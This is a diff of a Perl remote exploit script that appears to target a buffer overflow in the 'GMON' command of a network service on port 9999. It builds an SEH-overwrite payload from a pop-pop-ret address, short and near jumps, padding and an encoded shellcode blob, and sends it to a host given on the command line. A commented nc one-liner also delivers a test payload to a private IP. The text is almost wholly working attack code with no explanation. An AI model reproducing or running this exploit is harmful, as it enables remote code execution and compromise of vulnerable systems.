@@ -1,14 +1,14 @@
 #!/usr/bin/perl
-
+# perl -e 'print "GMON /" . "A" x 2731 . "B" x 767 . "\x90\xcc\xEB\x04" . pack("V", 0x625010B4 ) .  "\xE9\xF4\xFC\xFF\xFF". "\xcc" x 489;'  | nc 192.168.58.135 9999
+#
 use IO::Socket::INET;
 
-my $pref  = "GMON /AAAA";
-my $buf   = "\x90" x 2994;
-#my $seh1 = "\x90\x90\xEB\x04";		# nop, nop, jmp+4
-my $seh2 = pack("V", 0x6250615a);	# popad
-my $seh1  = "CCCC";
-#my $seh2  = "DDDD"; 
-my $shell = "\xCC" x 700;
+my $pref  = "GMON /";
+my $buf   = "A" x 2731;
+my $seh1 = "\x90\xcc\xEB\x04";		# nop, nop, jmp+4
+my $seh2 = pack("V", 0x625010B4);	# poppopret
+#my $seh1  = "CCCC";
+#my $seh2  = "DDDD";
 my $bjmp  = "\xE9\xF4\xFC\xFF\xFF";   # jmp near -780
 my $shellcode = 
 "\x89\xe6\xdb\xd1\xd9\x76\xf4\x5e\x56\x59\x49\x49\x49\x49" .
@@ -45,10 +45,12 @@ my $shellcode =
 "\x33\x44\x32\x42\x4f\x42\x4a\x45\x50\x46\x33\x4b\x4f\x48" .
 "\x55\x43\x53\x45\x31\x42\x4c\x42\x43\x46\x4e\x43\x55\x44" .
 "\x38\x45\x35\x45\x50\x45\x5a\x41\x41";
-my $align = "A" x 29;
+my $pad = 767 - length($shellcode);
+my $align = "\xcc" x $pad;
 
-my $evil = $pref . $buf . $shellcode . $align . $seh1 . $seh2 . $bjmp . $shell ;
+my $evil = $pref . $buf . $shellcode . $align . $seh1 . $seh2 . $bjmp . "\xcc" x 489 ;
 
 my $socket = IO::Socket::INET->new("$ARGV[0]:$ARGV[1]"); #192.168.58.134 9999
 print $socket $evil;
 close($socket);
+#print $evil;
